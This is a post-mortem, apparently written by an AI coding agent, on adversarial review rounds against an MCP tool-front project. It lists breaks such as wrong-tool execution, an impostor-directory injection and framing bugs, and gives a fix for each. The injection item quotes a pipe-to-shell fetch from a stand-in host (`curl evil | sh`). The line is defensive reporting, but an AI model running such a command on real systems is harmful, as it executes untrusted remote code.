# Adversarial rounds — synthesis and dispositions

Written by Claude (Fable, tool-templates driver), 2026-08-31, after Jonathan asked for adversarial convocations over everything the checkpoint panels had NOT seen: the fix commits that landed after each panel, and the infrastructure that never faced a panel at all. Two rounds, three brands each, framed to REFUTE. Raw answers are the `advfixes_*` and `advinfra_*` files beside this one.

The result answers Jonathan's question ("what are the odds almost none of it works") honestly: **twelve real breaks across the two rounds, several in code shipped this session, two of them SEVERE, and two of MY fixes for them had bugs the test suite then caught.** Everything below is fixed with a regression test, or refuted with the attack named. The panelist repro scripts are kept under `tools/xcode-mcp-front/findings/` and all exit 0 now.

## Round 1 — the post-panel fix commits (fixed in `1709a1e`)

**Cold-call wrong-tool execution** (all three brands, two with repros). The phase-3 "add-only refresh" stopped the refresh OVERWRITING a good entry but did nothing for a refresh into the EMPTY startup table: a client calling a remembered name before the first `tools/list` executed an alias claimant's tool under another upstream's natural name. Fixed by deleting the per-upstream refresh entirely — every dispatch miss now runs the same full two-pass composition as `tools/list`, so no path applies a lighter collision policy. The cold-call scenario is a permanent regression test.

**Launcher gate torn down a healthy deployment** (all three). run.sh's `jq` shape check passed a config the daemon's own loader rejects, so a bad template push preempted the RUNNING daemon and rewrote `.mcp.json` before dying. The gate is now `mcp_config.py resolve` — the daemon's real loader.

**Three smaller** (codex/qwen): the foreign-dialog-grace startup assertion aborted non-Xcode daemons with small connect timeouts over a constraint they can never hit — now bound to `require_xcode` upstreams only; an empty `version` string silently disabled the version check — rejected; the installer accepted a subdirectory of a repo as a target — now requires the top level, with physical-path comparison (my first version compared logical vs git-resolved paths and failed 22 assertions on first run).

## Round 2 — the never-paneled infrastructure (fixed in `56dbeb4`)

**SEVERE — impostor sibling injection** (claude leg, repro). astra-update's basename-sibling source fallback accepted ANY directory sharing the recorded name; a sibling containing `curl evil | sh` was copied in and run. The sibling must now prove git identity against a `source_remote` the manifest records at install. **My first fix was itself broken**: a bare `except Exception` swallowed a `NameError` from a missing `import subprocess`, so the git check returned None for every sibling and the impostor test passed only because the whole feature was dead. Narrowed the except so a programming error can never again read as "no remote" — exactly the "works because it's entirely broken" trap.

**SEVERE — blank line read as EOF** (claude leg, repro). mcp_tools' framing returned `""` for both a zero-length line and a closed stream, so one stray newline collapsed a healthy probe into "no answer to initialize." EOF is now its own sentinel object.

**Fast tier could not catch a hung file** (all three). The budget check ran only after every file exited, so one wedged file stalled the tier forever. Each file now runs under `timeout`; a kill is a loud failure. (My `-I{}` version overran xargs's command-size limit — switched to `-n1`.)

**template uninstall crash and silent tool-deletion** (claude leg). Uninstalling a leaf crashed on a still-installed wrapper's unresolvable member, and a tool claimed only through a now-missing member got deleted. Fixed at the root the way QUESTIONS.md predicted: the manifest records each template's RESOLVED tool list at install, so uninstall reasons from what was installed, not from a catalogue that changed.

**periphery broke swift-ios uninstall** (claude leg). A machine-wide member rejected the `--into` template contract, so uninstalling swift-ios left it half-removed with the manifest lying. `uc_parse` (shared by every uninstaller) now accepts `--into`.

**tooljson whitespace/duplicate deps** (claude leg). `brew:   ` cleared the empty gate; duplicates passed twice. Both rejected.

## Held under attack (the attacks, named)

`red()`'s contract held — the residual is a call-site passing a too-generic diagnostic, which red() cannot enforce, and no live call site does. The id-matched framing held against interleaved notifications (round-2 #2 is a DIFFERENT hole it left open). The `id(connection)` reuse and half-written-SSE-frame hazards were refuted by the SDK reference chain. xargs on a spaced filename held. The double-fire of the break notification is coalesced by the broadcaster debounce with no zero-fire path.

## What this exercise established

Two SEVERE breaks and a wrong-tool execution survived the three checkpoint panels and were only caught when the fixes themselves were attacked. The lesson is the one Jonathan pressed: a "fixed" claim is a claim, and a test that has never run against a hostile input proves nothing. Every fix here carries a regression test that was watched to fail first, and the two fixes that were themselves wrong were caught the same way.
